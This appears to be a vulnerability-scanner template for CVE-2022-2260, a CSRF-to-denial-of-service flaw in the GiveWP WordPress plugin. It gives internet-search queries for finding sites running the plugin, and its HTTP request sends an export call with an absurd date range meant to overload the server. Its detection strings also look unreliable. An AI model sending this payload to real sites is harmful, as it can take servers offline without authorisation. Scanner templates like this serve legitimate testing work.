id: CVE-2022-2260

info:
  name: GiveWP Plugin CSRF to DoS Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: The GiveWP WordPress plugin before 2.21.3 does not have CSRF in place when exporting data, and does not validate the exporting parameters such as dates, which could allow attackers to make a logged in admin DoS the web server via a CSRF attack as the plugin will try to retrieve data from the database many times which leads to overwhelm the target's CPU.
  impact: |
    An attacker can exploit this vulnerability to launch DoS attacks on the GiveWP Plugin.
  remediation: |
    Update GiveWP Plugin to the latest version to mitigate the CSRF vulnerability.
  reference:
    - https://wpscan.com/vulnerability/831b3afa-8fa3-4cb7-8374-36d0c368292f
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H
    cvss-score: 6.5
    cve-id: CVE-2022-2260
    cwe-id: CWE-352
    epss-score: 0.00061
    epss-percentile: 0.27417
    cpe: cpe:2.3:a:givewp:givewp:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: givewp
    product: givewp
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/give/"
    fofa-query: body=/wp-content/plugins/give/
    publicwww-query: /wp-content/plugins/give/
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/edit.php?post_type=give_forms&page=give-tools&tab=export"

    body: |
      start_year=&start_month=6&end_year=9000&end_month=6&give-action=earnings_export

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Database overload"
          - "Service unavailable"
        part: body
